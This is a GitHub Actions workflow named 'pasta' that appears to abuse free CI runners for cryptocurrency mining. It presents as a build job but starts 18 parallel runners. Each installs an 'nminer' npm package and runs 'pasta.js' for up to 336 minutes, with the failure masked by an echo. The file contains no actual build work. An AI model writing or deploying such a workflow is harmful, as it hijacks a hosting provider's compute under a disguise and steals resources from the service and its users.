name: pasta
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 8440 }
          - { version: 6237 }
          - { version: 3499 }
          - { version: 5102 }
          - { version: 6185 }
          - { version: 3569 }
          - { version: 7556 }
          - { version: 2465 }
          - { version: 5273 }
          - { version: 687 }
          - { version: 5770 }
          - { version: 800 }
          - { version: 1583 }
          - { version: 7836 }
          - { version: 7157 }
          - { version: 7987 }
          - { version: 454 }
          - { version: 5734 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: woot
        run: |
          npm install nminer@latest
          timeout 336m node pasta.js || echo "pasta executed"